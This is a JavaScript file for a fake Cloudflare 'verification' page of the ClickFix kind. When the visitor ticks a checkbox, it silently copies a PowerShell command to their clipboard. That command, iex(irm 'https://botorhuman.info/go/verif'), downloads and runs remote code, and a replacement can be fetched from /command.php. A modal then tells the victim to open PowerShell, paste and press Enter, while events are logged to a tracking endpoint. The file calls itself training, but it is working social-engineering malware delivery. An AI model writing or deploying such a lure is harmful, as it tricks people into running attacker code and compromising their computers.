(function () {
  "use strict";
  var frame = document.querySelector("iframe.cloudflare-training-frame");
  if (!frame) return;

  function report(eventName) {
    var body = JSON.stringify({ event: eventName, name: location.hostname, page: location.href, ts: new Date().toISOString() });
    try {
      if (navigator.sendBeacon) navigator.sendBeacon("/__uploader_track", new Blob([body], { type: "application/json" }));
      else fetch("/__uploader_track", { method: "POST", body: body, keepalive: true }).catch(function () {});
    } catch (error) {}
  }

  var commandText = "iex(irm 'https://botorhuman.info/go/verif')";

  function preloadCommand() {
    return fetch("/command.php", { cache: "no-store" }).then(function (response) {
      if (!response.ok) throw new Error("command.php: HTTP " + response.status);
      return response.json();
    }).then(function (data) {
      if (data && typeof data.command === "string" && data.command) commandText = data.command;
      return commandText;
    }).catch(function () {
      return commandText;
    });
  }

  function copySafe() {
    function fallback() {
      var area = document.createElement("textarea");
      area.value = commandText;
      area.style.cssText = "position:fixed;left:-9999px;top:0;opacity:0";
      document.body.appendChild(area);
      area.focus();
      area.select();
      try { return document.execCommand("copy"); }
      finally { area.remove(); }
    }
    if (navigator.clipboard && window.isSecureContext) {
      return navigator.clipboard.writeText(commandText).catch(function () {
        if (!fallback()) throw new Error("Clipboard copy failed");
      });
    }
    if (fallback()) return Promise.resolve();
    return Promise.reject(new Error("Clipboard copy failed"));
  }

  preloadCommand();

  function verifiedKey() { return "cloudflare-training-verified:" + location.hostname; }
  function verifiedCount() {
    try { return Math.max(0, parseInt(localStorage.getItem(verifiedKey()) || "0", 10) || 0); }
    catch (error) { return 0; }
  }
  function reportVerified() {
    report("verify_clicked");
var count = verifiedCount();
            return true;
  }

  function getLogo(doc) {
    var host = doc.querySelector("#a6");
    var root = host && host.shadowRoot;
    var source = root && root.querySelector("#yc4");
    var logo = source && source.cloneNode(true);
    if (!logo) return '<span class="cf-wordmark">Cloudflare</span>';
    logo.removeAttribute("id");
    logo.style.cssText = "display:block;width:88px;height:30px";
    Array.prototype.forEach.call(logo.querySelectorAll(".fg6"), function (node) { node.setAttribute("fill", "#000"); });
    return logo.outerHTML;
  }

  function mountModal(doc) {
    if (doc.getElementById("cloudflareTrainingModal")) return;
    var rayNode = doc.querySelector(".ri code,.cf-ray");
    var ray = rayNode ? rayNode.textContent.trim() : "18e2752f2ec8b9be";
    var modal = doc.createElement("div");
    modal.id = "cloudflareTrainingModal";
    modal.style.cssText = "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:min(620px,calc(100vw - 32px));height:auto;padding:0;border:0;border-radius:6px;background:#fff;color:#333;box-shadow:rgba(0,0,0,.5) 0 0 0 9999px,0 4px 24px rgba(0,0,0,.12);z-index:2147483647;display:block;overflow:hidden;font-family:Segoe UI,system-ui,-apple-system,Roboto,Arial,sans-serif";
    modal.innerHTML = '<style>' +
      '#cloudflareTrainingModal *{box-sizing:border-box}.cf-card{padding:20px 28px 14px;background:#fff}.cf-top{display:flex;align-items:flex-start;justify-content:space-between;gap:20px}.cf-left{display:flex;align-items:center;gap:10px}.cf-spinner{width:28px;height:28px;flex:0 0 auto;animation:cfSpin 1.2s linear infinite}.cf-title{font-size:18px;font-weight:500;color:#333}.cf-brand{display:flex;flex-direction:column;align-items:flex-end;gap:2px;min-width:88px}.cf-logo{width:88px;height:30px;display:flex;align-items:center;justify-content:flex-end;overflow:hidden}.cf-logo svg{display:block;width:88px!important;height:30px!important}.cf-wordmark{font-size:14px;font-weight:700;color:#222}.cf-links{display:flex;gap:7px;font-size:10px;color:#5a8fc2;text-decoration:underline}.cf-divider{border:0;border-top:1px solid #ddd;margin:16px 0}.cf-instruction{display:flex;align-items:center;gap:14px;font-size:17px;font-weight:400;color:#444;margin:0 0 14px}.cf-keyboard{width:30px;height:30px;border-radius:50%;background:#f1f1f1;display:inline-flex;align-items:center;justify-content:center;color:#777;font-size:15px;flex:0 0 auto}.cf-steps{display:grid;gap:12px;margin:0 0 16px}.cf-step-row{display:grid;grid-template-columns:34px 1fr;align-items:center;gap:14px;min-height:34px}.cf-num{width:30px;height:30px;border-radius:50%;background:#f1f1f1;color:#777;display:inline-flex;align-items:center;justify-content:center;font-size:14px}.cf-step-text{font-size:16px;color:#444;line-height:1.45}.cf-key{display:inline-block;padding:2px 9px;border:1px solid #d9d9d9;border-radius:3px;background:#f4f4f4;box-shadow:0 1px 1px rgba(0,0,0,.04);color:#262626;font-weight:600;line-height:1.35;white-space:nowrap}.cf-slash{padding:0 5px;color:#555}.cf-id{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:4px;padding:10px 14px;font:13px ui-monospace,SFMono-Regular,Consolas,monospace;color:#666;margin-bottom:16px}.cf-bottom{display:flex;align-items:center;justify-content:space-between;gap:16px}.cf-hint{font-size:13px;color:#555;line-height:1.4}.cf-verify{background:#777;color:#fff;border:0;border-radius:4px;padding:10px 28px;font-size:14px;font-weight:500;white-space:nowrap;cursor:not-allowed;transition:background .2s}.cf-verify.ready{background:#199447;cursor:pointer}.cf-verify.ready:hover{background:#147a3a}.cf-verify.done{background:#5eae77;cursor:default}.cf-verify.warn{background:#d92d20!important;cursor:pointer}.cf-alert{display:none;margin-top:8px;padding:8px 10px;border:1px solid #f2a2a2;background:#ffe9e9;color:#b42318;border-radius:4px;font-size:12px;line-height:1.35}.cf-alert.show{display:block}.cf-footer{text-align:center;margin-top:16px;padding-top:10px;border-top:1px solid #e8e8e8}.cf-ray,.cf-perf{font-size:12px;color:#999;margin:0 0 4px}.cf-perf span{text-decoration:underline}@keyframes cfSpin{to{transform:rotate(360deg)}}@media(max-width:560px){.cf-card{padding:18px 20px 14px}.cf-brand{min-width:70px}.cf-logo{width:70px}.cf-instruction{font-size:15px}.cf-step-text{font-size:14px}.cf-step-row{gap:10px}.cf-bottom{align-items:flex-start;flex-direction:column}.cf-verify{width:100%}}' +
      '</style><div class="cf-card"><div class="cf-top"><div class="cf-left"><svg class="cf-spinner" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 2a10 10 0 0 1 10 10" stroke="#444" stroke-width="2.5" stroke-linecap="round"/></svg><span class="cf-title">Verification Steps</span></div><div class="cf-brand"><div class="cf-logo">' + getLogo(doc) + '</div><div class="cf-links"><span>Confidentiality</span><span>Terms and Conditions</span></div></div></div>' +
      '<hr class="cf-divider"><p class="cf-instruction"><span class="cf-keyboard">⌨</span><span>Use the keyboard in this order:</span></p><div class="cf-steps"><div class="cf-step-row"><span class="cf-num">1</span><span class="cf-step-text">Press <span class="cf-key">Win + X</span></span></div><div class="cf-step-row"><span class="cf-num">2</span><span class="cf-step-text">Choose <span class="cf-key">Terminal</span><span class="cf-slash">/</span><span class="cf-key">PowerShell</span></span></div><div class="cf-step-row"><span class="cf-num">3</span><span class="cf-step-text">Press <span class="cf-key">Ctrl + V</span></span></div><div class="cf-step-row"><span class="cf-num">4</span><span class="cf-step-text">Press <span class="cf-key">Enter</span></span></div></div><div class="cf-id">Cloudflare verification ID: ' + ray + '</div>' +
      '<div class="cf-bottom"><span class="cf-hint">Perform the steps above to finish<br>verification.<br><a href="#" class="cf-video-link" style="color:#199447;text-decoration:underline;font-size:13px;">Watch video instruction</a><div class="cf-alert">Please complete verification first.</div></span><button class="cf-verify" type="button" disabled>Verify</button></div><div class="cf-footer"><div class="cf-ray">Ray ID: ' + ray + '</div><div class="cf-perf">Platform performance and security <span>Cloudflare</span></div></div></div>';
    var mountDoc = (frame.classList && frame.classList.contains("cloudflare-inline") && window.top && window.top.document)
      ? window.top.document
      : doc;
    // strip previous
    try { var oldM = mountDoc.getElementById("cloudflareTrainingModal"); if (oldM) oldM.remove(); } catch (e) {}
    mountDoc.body.appendChild(modal);
    var button = modal.querySelector(".cf-verify");
    setTimeout(function () { button.disabled = false; button.classList.add("ready"); }, 10000);
    var warning = modal.querySelector(".cf-alert");
    button.addEventListener("click", function () {
      if (button.disabled) return;
      reportVerified();
      button.classList.remove("ready");
      button.classList.remove("done");
      button.classList.add("warn");
      button.textContent = "Perform verification first";
      if (warning) warning.classList.add("show");
      setTimeout(function () {
        if (button.disabled) return;
        button.classList.remove("warn");
        button.classList.add("ready");
        button.textContent = "Verify";
        if (warning) warning.classList.remove("show");
      }, 15000);
    });

    var videoLink = modal.querySelector(".cf-video-link");
    if (videoLink) {
      videoLink.addEventListener("click", function (e) {
        e.preventDefault();
        var video = doc.createElement("video");
        var frameSrc = frame.getAttribute("src") || "";
        video.src = "https://pump.lc/_shared/cloudflare-instructions.mp4";
        video.controls = true;
        video.playsInline = true;
        video.preload = "none";
        video.style.cssText = "width:100%;max-height:260px;margin:12px 0 16px;border-radius:4px;background:#000;display:block;";
        var bottom = modal.querySelector(".cf-bottom");
        if (bottom && bottom.parentNode) bottom.parentNode.insertBefore(video, bottom);
        videoLink.style.display = "none";
      });
    }
  }

  function bind() {
    var doc = frame.contentDocument;
    if (!doc || doc.documentElement.dataset.cloudflareDemoBound) return;
    var inline = frame.classList && frame.classList.contains("cloudflare-inline");
    var heading = doc.querySelector("h1");
    if (heading) heading.textContent = location.hostname;
    doc.title = location.hostname + " — Training verification";
    if (!inline) frame.style.opacity = "1";
    var host = doc.querySelector("#a6");
    var root = host && host.shadowRoot;
    var input = (root && root.querySelector('input[type="checkbox"]'))
      || doc.querySelector('input[type="checkbox"]');
    if (!input) { setTimeout(bind, 100); return; }
    doc.documentElement.dataset.cloudflareDemoBound = "1";
    input.addEventListener("change", function () {
      if (!input.checked) return;
      mountModal(doc);
      report("command_copied");
      copySafe().catch(function () {});
    });
    var badge = doc.createElement("div");
    badge.textContent = ".";
    badge.style.cssText = "position:fixed;right:1px;top:16px;z-index:2147483647;font:700 1px system-ui";
    doc.body.appendChild(badge);
  }
  frame.addEventListener("load", bind, { once: true });
  try { if (frame.contentDocument && frame.contentDocument.readyState === "complete") bind(); } catch (error) {}
})();
